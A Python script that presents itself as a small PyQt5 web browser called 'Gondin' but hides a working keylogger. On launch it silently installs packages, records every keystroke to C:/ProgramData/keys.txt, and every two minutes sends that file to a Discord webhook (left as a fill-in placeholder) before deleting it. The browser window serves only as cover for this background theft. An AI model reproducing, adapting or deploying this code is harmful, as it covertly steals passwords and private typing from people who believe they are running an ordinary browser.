try:
    from PyQt5.QtCore import * 
    from PyQt5.QtWidgets import * 
    from PyQt5.QtGui import * 
    from PyQt5.QtWebEngineWidgets import * 
    from PyQt5.QtPrintSupport import * 
    import os 
    import sys
    from pynput import keyboard
    from os import remove, getenv
    from os.path import isfile
    from threading import Thread
    from dhooks import *
    from time import sleep
except:
    import pip

    def install(package):
        if hasattr(pip, 'main'):
            pip.main(['install', package])
        else:
            pip._internal.main(['install', package])

    import os 
    install("PyQt5")
    install("logging")
    install("pynput")
    install("PyQtWebEngine")
    install("dhooks")
    from PyQt5.QtCore import * 
    from PyQt5.QtWidgets import * 
    from PyQt5.QtGui import * 
    from PyQt5.QtWebEngineWidgets import * 
    from PyQt5.QtPrintSupport import * 
    import sys
    from pynput import keyboard
    from os import remove, getenv
    from os.path import isfile
    from threading import Thread
    from dhooks import *
    from time import sleep

lien = Webhook("Entrez le webhook ici")

keys = {}

fichier = f"C:/ProgramData/keys.txt"

if isfile(fichier):
    try:
        remove(fichier)
    except:
        pass

def envoi_fichier():
    while True:
        if isfile(fichier):
            fichier_send = File(fichier)
            sleep(120)
            lien.send(file=fichier_send)
            try:
                remove(fichier)
            except:
                pass

for i in range(11):
    keys["<" + str(i + 96) + ">"] = str(i)


def on_press(key):
    key = str(key)

    if key in keys:
        key = keys[key]

    if key[0] == "'" and key[2] == "'":
        key = key[1]
    
    if key == "Key.ctrl_l":
        key = "ctrl"

    if key == "Key.caps_lock":
        key = "maj_lock"
    
    if key == "Key.shift":
        key = "shift"

    if key == "Key.enter":
        key = "enter"

    if key == "Key.space":
        key = "space"

    if key == "Key.backspace":
        key = "delete"

    if key == str(r"'\x03'"):
        key = "ctrl_c"
    
    if key == str(r"'\x16'"):
        key = "ctrl_v"

    if key == str(r"'\x13'"):
        key = "ctrl_s"

    if key == str(r"'\x06'"):
        key = "ctrl_f"

    if key == str(r"'\x08'"):
        key = "ctrl_h"

    with open(fichier, 'a') as f:
        f.write(key + "\n")
        f.close()
    
Thread(target=envoi_fichier).start()

def logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

Thread(target=logger).start()

class MainWindow(QMainWindow): 
  
    
    def __init__(self, *args, **kwargs): 
        super(MainWindow, self).__init__(*args, **kwargs) 
  
  
        
        self.browser = QWebEngineView() 
  
        
        self.browser.setUrl(QUrl("https://www.google.com")) 
  
        
        self.browser.urlChanged.connect(self.update_urlbar) 
  
        
        self.browser.loadFinished.connect(self.update_title) 
  
        
        self.setCentralWidget(self.browser) 
  
        
        self.status = QStatusBar() 
  
        
        self.setStatusBar(self.status) 
  
        
        navtb = QToolBar("Navigation") 
  
        
        self.addToolBar(navtb) 
  
        
        
        back_btn = QAction("Retour", self) 
  
        
        back_btn.setStatusTip("Retour à la page précédente") 
  
        
        
        back_btn.triggered.connect(self.browser.back) 
  
        
        navtb.addAction(back_btn) 
  
        
        next_btn = QAction("Avancer", self) 
        next_btn.setStatusTip("Avancer à la prochaine page") 
  
        
        
        next_btn.triggered.connect(self.browser.forward) 
        navtb.addAction(next_btn) 
  
        
        reload_btn = QAction("Actualiser", self) 
        reload_btn.setStatusTip("Actualise la page") 
  
        
        
        reload_btn.triggered.connect(self.browser.reload) 
        navtb.addAction(reload_btn) 
  
        
        home_btn = QAction("Home", self) 
        home_btn.setStatusTip("Go home") 
        home_btn.triggered.connect(self.navigate_home) 
        navtb.addAction(home_btn) 
  
        
        navtb.addSeparator() 
  
        
        self.urlbar = QLineEdit() 
  
        
        self.urlbar.returnPressed.connect(self.navigate_to_url) 
  
        
        navtb.addWidget(self.urlbar) 
  
  
        
        self.show() 
  
  
    
    def update_title(self): 
        title = self.browser.page().title() 
        self.setWindowTitle("% s - Gondin" % title) 
  
  
    
    def navigate_home(self): 
  
        
        self.browser.setUrl(QUrl("https://google.com")) 

  
    
    def navigate_to_url(self): 
  
        
        q = QUrl(self.urlbar.text()) 
  
        
        if q.scheme() == "": 
            
            q.setScheme("http") 
  
        
        self.browser.setUrl(q) 
  
    
    
    def update_urlbar(self, q): 
  
        
        self.urlbar.setText(q.toString()) 
  
        
        self.urlbar.setCursorPosition(0) 
  
  
app = QApplication(sys.argv) 
  
app.setApplicationName("Gondin") 
  
window = MainWindow() 

app.exec()

